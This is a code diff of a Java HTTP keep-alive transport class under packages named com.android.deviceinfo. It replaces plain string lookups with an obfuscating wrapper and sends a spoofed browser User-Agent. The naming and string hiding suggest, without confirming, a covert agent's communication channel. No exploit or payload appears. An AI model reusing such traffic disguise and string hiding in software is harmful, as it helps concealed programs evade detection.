@@ -16,23 +16,20 @@ import org.apache.http.HttpResponse;
 import org.apache.http.HttpStatus;
 import org.apache.http.HttpVersion;
 import org.apache.http.client.methods.HttpPost;
-import org.apache.http.conn.ConnectionKeepAliveStrategy;
-import org.apache.http.conn.params.ConnManagerParams;
 import org.apache.http.conn.scheme.PlainSocketFactory;
 import org.apache.http.conn.scheme.Scheme;
 import org.apache.http.conn.scheme.SchemeRegistry;
 import org.apache.http.cookie.Cookie;
 import org.apache.http.entity.ByteArrayEntity;
 import org.apache.http.impl.client.DefaultHttpClient;
-import org.apache.http.impl.conn.tsccm.ThreadSafeClientConnManager;
 import org.apache.http.params.BasicHttpParams;
 import org.apache.http.params.HttpConnectionParams;
 import org.apache.http.params.HttpProtocolParams;
 
-import com.android.deviceinfo.Messages;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.Utils;
+import com.android.m.M;
 
 public abstract class HttpKeepAliveTransport extends HttpTransport {
 	private static final String TAG = "HttpKeepAliveTransport"; //$NON-NLS-1$
@@ -69,9 +66,9 @@ public abstract class HttpKeepAliveTransport extends HttpTransport {
 
 		final HttpPost httppost = new HttpPost(baseurl);
 
-		httppost.setHeader(Messages.getString("3_0"), //$NON-NLS-1$
-		Messages.getString("3_1")); //$NON-NLS-1$
-		httppost.setHeader(Messages.getString("3_2"), Messages.getString("3_3")); //$NON-NLS-1$ //$NON-NLS-2$
+		httppost.setHeader(M.d("User-Agent"), //$NON-NLS-1$
+		M.d("Mozilla/5.0 (Linux; U; Android 0.5; en-us) AppleWebKit/522+ (KHTML, like Gecko) Safari/419.3")); //$NON-NLS-1$
+		httppost.setHeader(M.d("Content-Type"), M.d("application/octet-stream")); //$NON-NLS-1$ //$NON-NLS-2$
 
 		if (cookies != null) {
 			for (final Cookie cookie : cookies) {
